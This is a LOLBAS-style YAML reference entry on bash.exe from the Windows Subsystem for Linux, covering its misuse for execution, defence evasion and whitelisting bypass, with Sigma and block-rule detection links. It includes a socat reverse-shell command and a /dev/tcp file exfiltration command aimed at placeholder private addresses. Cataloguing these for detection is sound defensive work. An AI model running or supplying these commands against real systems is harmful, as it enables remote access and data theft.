---
Name: Bash.exe
Description: File used by Windows subsystem for Linux
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: bash.exe -c calc.exe
    Description: Executes calc.exe from bash.exe
    Usecase: Performs execution of specified file, can be used as a defensive evasion.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10
  - Command: bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
    Description: Executes a reverseshell
    Usecase: Performs execution of specified file, can be used as a defensive evasion.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10
  - Command: bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24'
    Description: Exfiltrate data
    Usecase: Performs execution of specified file, can be used as a defensive evasion.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10
  - Command: bash.exe -c calc.exe
    Description: Executes calc.exe from bash.exe
    Usecase: Performs execution of specified file, can be used to bypass Application Whitelisting.
    Category: AWL Bypass
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10
Full_Path:
  - Path: C:\Windows\System32\bash.exe
  - Path: C:\Windows\SysWOW64\bash.exe
Code_Sample:
  - Code:
Detection:
  - BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
  - Sigma: https://github.com/SigmaHQ/sigma/blob/960a03eaf480926ed8db464477335a713e9e6630/rules/windows/process_creation/win_pc_lobas_bash.yml
  - IOC: Child process from bash.exe
Resources:
  - Link: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
Acknowledgement:
  - Person: Alex Ionescu
    Handle: '@aionescu'
  - Person: Asif Matadar
    Handle: '@d1r4c'
---
